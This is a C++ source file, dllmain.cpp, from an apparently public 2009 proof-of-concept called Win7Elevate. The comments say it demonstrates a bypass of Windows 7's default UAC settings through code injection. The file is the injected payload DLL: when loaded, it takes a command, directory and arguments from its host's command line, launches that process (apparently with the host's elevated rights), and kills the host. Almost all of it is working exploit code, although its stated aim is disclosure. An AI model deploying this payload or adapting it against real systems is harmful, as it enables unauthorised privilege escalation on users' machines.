// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"

// All code (except for GetElevationType) (C) Leo Davidson, 8th February 2009, all rights reserved.
// (Minor tidy-up 12th June 2009 for the code's public release.)
// http://www.pretentiousname.com
// leo@ox.compsoc.net
//
// Using any part of this code for malicious purposes is expressly forbidden.
//
// This proof-of-concept code is intended only to demonstrate that code-injection
// poses a real problem with the default UAC settings in Windows 7 (tested with RC1 build 7100).
//
// Win7Elevate_Inject.cpp is the most interesting file. Most of the rest is just boilerplate UI/util code.

//#define DEBUG_MESSAGE_BOXES

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		{
			// Don't do this at home, folks.
			//
			// Don't put a DllMain like this in production code.
			//
			// Calling a Shell32 function like CommandLineToArgvW in DllMain isn't big or clever.
			// Creating a process and killing the host process in DllMain is obviously
			// non-kosha, too. But it works well enough for my proof-of-concept.

#ifdef DEBUG_MESSAGE_BOXES
			MessageBox(NULL, L"Hello", L"W7E", MB_OK);
			MessageBox(NULL, GetCommandLine(), L"W7E: Args", MB_OK);
#endif

			int argc = 0;

			wchar_t **argv = CommandLineToArgvW(GetCommandLine(), &argc);

			if (argc != 4)
			{
#ifdef DEBUG_MESSAGE_BOXES
				MessageBox(NULL, GetCommandLine(), L"W7E: Wrong number of args", MB_OK);
#endif
			}
			else
			{
				wchar_t *szCmd  = argv[1];
				wchar_t *szDir  = argv[2];
				wchar_t *szArgs = argv[3];

				STARTUPINFO startupInfo = {0};
				startupInfo.cb = sizeof(startupInfo);
				PROCESS_INFORMATION processInfo = {0};

				if (CreateProcess(szCmd, szArgs, NULL, NULL, FALSE, 0, NULL, szDir, &startupInfo, &processInfo))
				{
					CloseHandle(processInfo.hProcess);
					CloseHandle(processInfo.hThread);
				}

				// gg k bye thx
				// The host process is hosed either way since we're not the DLL it thought we were.
				ExitProcess(-69);
			}
		}
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
